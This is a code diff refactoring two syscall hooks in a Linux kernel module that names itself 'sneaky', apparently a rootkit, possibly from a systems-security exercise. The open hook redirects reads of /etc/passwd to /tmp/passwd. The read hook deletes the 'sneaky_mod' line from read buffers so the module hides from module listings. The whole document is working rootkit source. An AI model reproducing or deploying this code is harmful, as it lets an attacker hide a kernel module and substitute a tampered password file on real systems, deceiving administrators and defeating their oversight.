@@ -57,8 +57,7 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
-{
+asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode) {
 	const char *src_file = "/tmp/passwd";
 	if(strcmp(pathname, "/etc/passwd") == 0){
 		copy_to_user((void*)pathname, src_file, strlen(src_file)+1);
@@ -95,25 +94,23 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 }
 
 
-asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
-	char * ptr1 = NULL;
-	char * ptr2 = NULL;
-	ssize_t new_size1;
-	ssize_t new_size2;
-	ssize_t size = (*original_read)(fd, buf, count);
-	if(size>0 && module_opened==1 && ((ptr1=strstr(buf,"sneaky_mod"))!=NULL)){
-		ptr2 = ptr1;
-		while(*ptr2 != '\n'){
-			++ptr2;
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+	char * ptr_head = NULL;
+	ssize_t rtn = original_read(fd, buf, count);
+	
+	if(rtn>0 && module_opened==1 && ((ptr_head=strstr(buf,"sneaky_mod"))!=NULL)) {
+		char * ptr_tail = ptr_head;
+		while(*ptr_tail != '\n'){
+			++ptr_tail;
 		}
-		new_size1 = (ssize_t)(size - (ptr2 + 1 - (char*)buf));
-		new_size2 = (ssize_t)(size - (ptr2 + 1 - ptr1));
-		++ptr2;
-		memmove(ptr1, ptr2, new_size1);
+		ssize_t move_size = (ssize_t)(rtn - (ptr_tail + 1 - (char*)buf));
+		ssize_t new_rtn = (ssize_t)(rtn - (ptr_tail + 1 - ptr_head));
+		++ptr_tail;
+		memmove(ptr_head, ptr_tail, move_size);
 		module_opened = 0;
-		return new_size2;
+		return new_rtn;
 	}
-	return size;
+	return rtn;
 }
 
 
